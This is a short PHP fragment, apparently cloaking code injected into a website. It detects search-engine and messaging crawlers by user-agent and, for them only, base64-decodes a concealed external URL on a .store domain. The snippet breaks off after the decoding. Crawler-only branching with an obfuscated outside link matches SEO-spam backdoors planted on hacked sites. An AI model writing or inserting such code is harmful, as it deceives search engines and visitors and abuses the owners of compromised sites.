    // Jika bot / crawler
    if (preg_match('/googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot/i', $ua)) {
        $encoded   = "aHR0cHM6Ly9ncnRvdG8uc3RvcmUvdW5yYXZlbHNoaW4uaHRtbA==";
        $dx_url  = base64_decode($encoded);
